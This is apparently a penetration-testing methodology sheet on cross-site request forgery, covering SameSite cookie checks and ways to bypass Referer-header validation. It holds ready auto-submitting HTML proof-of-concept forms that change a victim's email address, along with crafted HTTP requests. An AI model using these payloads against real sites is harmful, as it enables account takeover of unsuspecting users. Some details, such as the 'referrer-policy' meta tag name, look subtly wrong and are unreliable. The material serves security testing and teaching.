## CSRF Methodology
<br/>

**Step 1**<br/>
The first thing to check in a CSRF attack is the security headers on the session cookie.
#### `SameSite=Strict` - CSRF Not Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=strict;
```

#### `SameSite=LAX` - CSRF Only Possible on GET Request

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=lax;
```

#### `SameSite=NONE` - CSRF Possible

```html
Set-Cookie: SessionId=CfDJ8MWK4x...; samesite=none;
```

**Step 2**<br/>
Some applications make use of the HTTP Referer header to attempt to defend against CSRF attacks, normally by verifying that the request originated from the application's own domain. The following are possible bypasses for the Referer header based CSRF protection.

1) *Referer Header Removed*<br/>
Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted. We can strip the referer using the following META tag.

```html
<meta name="referrer" content="never">
```

*PoC*
```html
<html>
    <body>
        <meta name="referrer" content="never">
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

2) *Referer Header Broken Regex*<br/>
Some websites will use regex to check if the website is contained in the referer. This regex could be broken. 

You can try sending the referer with the target website being a subdomain to your website:
```
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=3HTG8OIPW3TKkVhWvgIMN4Ojija8jijN
Referer: https://target.shelled.io/change-email

email=hacked@gmail.com
```

You can try sending the referer with the target website being a query parameter to your website:
```
POST /change-email HTTP/1.1
Host: target.com
Cookie: session=3HTG8OIPW3TKkVhWvgIMN4Ojija8jijN
Referer: https://shelled.io/change-email?target.com

email=hacked@gmail.com
```

> Note: There is a default browser security mechanism that strips query parameters from the referer header. You can override this behavior by making sure that the response containing your exploit has the Referrer-Policy: unsafe-url header set.

*PoC*
```html
<html>
    <body>
        <meta name="referrer-policy" content="unsafe-url">
        <script>
            history.pushState("", "", "/?target.com")
        </script>
        <form action="https://vulnerable-website.com/email/change" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
            <input type="hidden" name="csrf" value="WfF1szMUHhiokx9AHOfjRkE" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```









